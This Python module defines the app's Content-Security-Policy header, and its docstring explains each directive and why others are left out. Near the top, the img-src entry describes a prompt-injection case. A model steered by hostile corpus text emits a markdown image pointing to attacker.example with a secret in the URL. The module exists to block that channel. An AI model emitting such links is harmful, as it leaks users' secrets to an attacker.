"""The Content-Security-Policy this app sends (agent-forge-harness-va8).

This is the SECOND of two layers. The first is `ui/src/components/Markdown.tsx`,
which drops every remote subresource out of model-authored markdown before it
reaches the DOM. This one is what protects the rest of the page, and what stops
a hole anywhere else in the app becoming the same exfiltration channel.

It lives in its own module, and not inline in `app.py`, because the policy has
to be byte-identical in two places — here and in the `server` block of
`ui/nginx.conf`, since nginx serves the SPA in Compose and in the browser E2E
while `app.py` serves it in production, and a header set in only one of them
means E2E tests a different posture from production (threat model R-6). One
constant is what lets `tests/test_security_headers_contract.py` compare the two
and fail when they drift.

Directive by directive:

``img-src 'self' data: blob:``
    The exfiltration channel this bead exists to close: a model steered by
    hostile corpus text emits ``![](https://attacker.example/?d=<secret>)`` and
    the reader's browser fetches it, handing the attacker the URL. ``data:`` and
    ``blob:`` stay because Vite inlines small imported images as ``data:`` URIs
    at build time; neither can reach a third-party host, and the markdown
    sanitiser drops a ``data:`` image of its own accord, so this only widens
    what the application's OWN bundle may render.

``connect-src 'self'``
    The other half of the same channel: fetch/XHR/WebSocket/``sendBeacon`` to a
    third-party origin. The SPA talks only to its own origin.

``object-src 'none'``
    ``<object>``/``<embed>``/``<applet>``. The app uses none, and they are a
    long-standing plugin-content bypass.

``base-uri 'self'``
    Stops an injected ``<base href>`` silently re-pointing every relative URL on
    the page, including the ones this policy would otherwise have allowed.

``frame-ancestors 'none'``
    Clickjacking. Nothing legitimately frames this app, and the sign-in screen
    is worth protecting today rather than at the first Workbench route.

Deliberately NOT here, so that a production security fix stays small and
reviewable: ``default-src``, ``script-src``, ``style-src``, ``font-src``.
``ui/index.html`` carries an inline ``<script>`` that restores the saved theme
before paint, and any ``script-src`` without a hash or ``'unsafe-inline'`` kills
it — while ``default-src`` would reach ``script-src`` by falling back. The
``style`` attributes that survive the markdown sanitiser are ``style-src-attr``'s
business. Those belong to the bead that writes the full policy (SEC-17 /
1kg.9.5), ``X-Content-Type-Options`` to SEC-17's bead, ``Permissions-Policy`` to
1ir.3.4, and the self-hosted VAD model and WASM allowances to 1ir.9.1.

A route may set a STRICTER policy of its own and keep it: the middleware in
`app.py` uses ``setdefault``, so the asset route of SEC-19 can answer with
``default-src 'none'; sandbox`` without having to unpick this.
"""

from __future__ import annotations

from typing import Final

#: Sent by `service.app`'s `set_security_headers` middleware and, byte for byte,
#: by `add_header Content-Security-Policy ... always;` in `ui/nginx.conf`.
#: `tests/test_security_headers_contract.py` fails if the two ever differ.
CONTENT_SECURITY_POLICY: Final[str] = (
    "img-src 'self' data: blob:; "
    "connect-src 'self'; "
    "object-src 'none'; "
    "base-uri 'self'; "
    "frame-ancestors 'none'"
)
